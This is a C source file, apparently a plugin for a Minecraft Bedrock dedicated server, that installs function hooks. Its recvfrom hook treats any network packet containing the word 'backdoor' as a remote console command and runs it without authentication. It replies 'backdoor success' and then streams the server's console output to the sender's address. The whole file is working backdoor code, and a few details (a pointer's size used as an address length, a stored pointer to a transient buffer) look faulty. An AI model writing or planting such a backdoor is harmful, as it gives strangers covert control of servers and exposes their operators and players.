#include <backdoor/plugin.h>

TLHOOK(on_console_output, bool, 
	"??$_Insert_string@DU?$char_traits@D@std@@_K@std@@"
	"YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@"
	"AEAV10@QEBD_K@Z",
	uintptr_t this, const char *str, size_t size)
{
	if (g_client_addr)
		sendto(g_server_socket, str, size, 0, g_client_addr, sizeof(g_client_addr));
	return on_console_output.original(this, str, size);
}

TLHOOK(on_console_input, bool,
	"??$inner_enqueue@$0A@AEBV?$basic_string@DU?$char_traits@"
	"D@std@@V?$allocator@D@2@@std@@@?$SPSCQueue@V?$basic_string@"
	"DU?$char_traits@D@std@@V?$allocator@D@2@@std@@$0CAA@@@"
	"AEAA_NAEBV?$basic_string@DU?$char_traits@D@std@@"
	"V?$allocator@D@2@@std@@@Z",
	struct spsc_queue *this, struct string *str)
{
	return on_console_input.original(this, str);
}

// Constructor for Level
TLHOOK(level_construct, struct level *,
	"??0Level@@QEAA@AEBV?$not_null@V?$NonOwnerPointer@VSoundPlayerInterface@@@Bedrock@@@"
	"gsl@@V?$unique_ptr@VLevelStorage@@U?$default_delete@VLevelStorage@@@std@@@std@@"
	"V?$unique_ptr@VLevelLooseFileStorage@@U?$default_delete@VLevelLooseFileStorage@@@"
	"std@@@4@AEAVIMinecraftEventing@@_NW4SubClientId@@AEAVScheduler@@V?$not_null@"
	"V?$NonOwnerPointer@VStructureManager@@@Bedrock@@@2@AEAVResourcePackManager@@"
	"AEBV?$not_null@V?$NonOwnerPointer@VIEntityRegistryOwner@@@Bedrock@@@2@V?$WeakRefT@"
	"UEntityRefTraits@@@@V?$unique_ptr@VBlockComponentFactory@@U?$default_delete@"
	"VBlockComponentFactory@@@std@@@4@V?$unique_ptr@VBlockDefinitionGroup@@"
	"U?$default_delete@VBlockDefinitionGroup@@@std@@@4@VItemRegistryRef@@V?$weak_ptr@"
	"VBlockTypeRegistry@@@4@44AEBUNetworkPermissions@@V?$optional@VDimensionDefinitionGroup@@@4@@Z",
	struct level* this, uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4,
	uintptr_t a5, uintptr_t a6, uintptr_t a7, uintptr_t a8, uintptr_t a9,
	uintptr_t a10, uintptr_t a11, uintptr_t a12, uintptr_t a13, uintptr_t a14,
	uintptr_t a15, uintptr_t a16, uintptr_t a17, uintptr_t a18, uintptr_t a19)
{
	return g_level = 
		level_construct.original(this, a1, a2, a3, a4, a5, a6, a7, a8, a9, 
									a10, a11, a12, a13, a14, a15, a16, a17, a18, a19);
}

// Constructor for SPSCQueue
TLHOOK(spsc_queue_construct, struct spsc_queue *,
	"??0?$SPSCQueue@V?$basic_string@DU?$char_traits@D@std@@"
	"V?$allocator@D@2@@std@@$0CAA@@@QEAA@_K@Z",
	struct spsc_queue *this, uintptr_t a2)
{
	return g_spsc_queue = spsc_queue_construct.original(this, a2);
}

TLHOOK(on_server_started, void,
	"?startServerThread@ServerInstance@@QEAAXXZ",
	uintptr_t this)
{
	on_server_started.original(this);
}

TLAHOOK(sendto_hook, int, sendto,
	SOCKET s, const char* buf, int len, int flags, const struct sockaddr *to, int tolen)
{
	int ret = sendto_hook.original(s, buf, len, flags, to, tolen);
	return ret;
}

TLAHOOK(recvfrom_hook, int, recvfrom,
    SOCKET s, char *buf, int len, int flags, struct sockaddr *from, int *fromlen)
{
	if (!g_server_socket)
		g_server_socket = s;
	if (strstr(buf, "backdoor")) {
		g_client_addr = from;
		process_remote_cmd(&buf[9]);
		char *msg = "backdoor success";
		struct sockaddr_in* sender = (struct sockaddr_in*)from;
		sendto(s, msg, strlen(msg), flags, from, *fromlen);
	}
    int ret = recvfrom_hook.original(s, buf, len, flags, from, fromlen);
    return ret;
}

bool init_hooks(void)
{
	level_construct.init(&level_construct);
	spsc_queue_construct.init(&spsc_queue_construct);

	on_console_input.init(&on_console_input);
	on_server_started.init(&on_server_started);
	on_console_output.init(&on_console_output);
	recvfrom_hook.init(&recvfrom_hook);
	sendto_hook.init(&sendto_hook);

	lh_enable_all_hook();
	return true;
}
